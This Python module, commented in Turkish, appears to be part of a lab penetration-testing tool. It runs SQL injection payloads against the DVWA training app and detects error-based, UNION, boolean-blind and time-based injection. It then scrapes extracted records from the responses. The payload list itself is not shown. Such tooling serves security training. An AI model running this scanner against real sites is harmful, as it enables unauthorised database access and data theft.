# -*- coding: utf-8 -*-
"""SQL Injection test modülü"""

import re
import time
import requests

from .base import BaseModule
from ..utils import Colors, Printer
from ..payloads import SQLI_PAYLOADS
from ..config import SQL_ERROR_PATTERNS


class SQLiModule(BaseModule):
    """SQL Injection testlerini çalıştıran modül"""

    MODULE_NAME = "SQL INJECTION TESTLERİ"

    def run(self):
        """SQL Injection testlerini çalıştır"""
        Printer.section(self.MODULE_NAME)

        if not self.session.logged_in:
            Printer.warning("DVWA'ya giriş yapılmamış, SQLi testleri atlanıyor")
            return

        sqli_url = f"{self.session.base_url}/vulnerabilities/sqli/"

        for i, sqli in enumerate(SQLI_PAYLOADS, 1):
            self.stats["total"] += 1
            payload = sqli["payload"]
            desc = sqli["description"]
            category = sqli["category"]

            print(f"\n  {Colors.DIM}[{i}/{len(SQLI_PAYLOADS)}] "
                  f"Kategori: {category}{Colors.RESET}")
            print(f"  {Colors.DIM}Payload : {payload[:60]}{'...' if len(payload) > 60 else ''}{Colors.RESET}")

            try:
                token = self.session.get_csrf_token(sqli_url)
                params = {"id": payload, "Submit": "Submit"}
                if token:
                    params["user_token"] = token

                resp = self.session.session.get(sqli_url, params=params, timeout=15)

                # SQL Injection başarı kriterleri
                is_success = False
                extra_info = ""

                # Hata mesajı varsa SQL Injection var demektir
                for error in SQL_ERROR_PATTERNS:
                    if error.lower() in resp.text.lower():
                        is_success = True
                        extra_info = "(SQL hata mesajı tespit edildi)"
                        break

                # Birden fazla sonuç döndüyse
                surname_count = resp.text.lower().count("surname")
                firstname_count = resp.text.lower().count("first name")
                if surname_count > 1 or firstname_count > 1:
                    is_success = True
                    extra_info = f"(Çoklu kayıt döndü: {max(surname_count, firstname_count)} sonuç)"

                # UNION SELECT başarılı olduysa
                if "union" in payload.lower() and ("user()" in resp.text.lower() or
                        "database()" in resp.text.lower() or
                        "information_schema" in resp.text.lower() or
                        "table_name" in resp.text.lower()):
                    is_success = True
                    extra_info = "(UNION sorgusu başarılı - veri çıkarıldı)"

                    # Çıkarılan veriyi göster
                    self._extract_and_display_data(resp.text)

                # Boolean blind - True/False koşullarını karşılaştır
                if "1=1" in payload and ("Surname" in resp.text or "First name" in resp.text):
                    is_success = True
                    extra_info = "(Boolean Blind SQLi - True koşulu veri döndürdü)"

                # Time-based blind - Yanıt süresi kontrolü
                if "SLEEP" in payload.upper():
                    start_time = time.time()
                    resp = self.session.session.get(sqli_url, params=params, timeout=15)
                    elapsed = time.time() - start_time
                    if elapsed >= 2.5:
                        is_success = True
                        extra_info = f"(Zaman tabanlı Blind SQLi - {elapsed:.1f}s gecikme)"

                if is_success:
                    self.stats["success"] += 1
                    self.stats["sqli_success"] += 1
                    Printer.success(f"{desc} → SQLi başarılı! {extra_info}")
                else:
                    self.stats["failed"] += 1
                    Printer.fail(f"{desc} → Payload etkisiz veya filtrelendi")

            except requests.Timeout:
                # Timeout da time-based SQLi başarısı olabilir
                if "SLEEP" in payload.upper():
                    self.stats["success"] += 1
                    self.stats["sqli_success"] += 1
                    Printer.success(f"{desc} → Zaman tabanlı SQLi (timeout tetiklendi)")
                else:
                    self.stats["failed"] += 1
                    Printer.fail(f"{desc} → İstek zaman aşımına uğradı")
            except Exception as e:
                self.stats["failed"] += 1
                Printer.fail(f"{desc} → Hata: {str(e)}")

            if i < len(SQLI_PAYLOADS):
                self.wait()

    @staticmethod
    def _extract_and_display_data(html_text):
        """SQL Injection ile elde edilen verileri ekrana yazdır"""
        print(f"\n  {Colors.RED}{Colors.BOLD}  ┌─ Çıkarılan Veriler ──────────────────────────┐{Colors.RESET}")

        # First name / Surname çiftlerini bul
        names = re.findall(r"First name:\s*(.*?)<", html_text)
        surnames = re.findall(r"Surname:\s*(.*?)<", html_text)

        if names and surnames:
            for name, surname in zip(names, surnames):
                name = name.strip()
                surname = surname.strip()
                if name or surname:
                    print(f"  {Colors.RED}  │  {name} : {surname}{Colors.RESET}")
        else:
            # Alternatif veri çıkarma
            data_patterns = re.findall(
                r"(?:ID|id).*?(?:First name|Name):\s*(.*?)(?:<br|<BR)", html_text, re.DOTALL
            )
            for data in data_patterns[:5]:
                print(f"  {Colors.RED}  │  {data.strip()[:60]}{Colors.RESET}")

        print(f"  {Colors.RED}{Colors.BOLD}  └────────────────────────────────────────────────┘{Colors.RESET}\n")
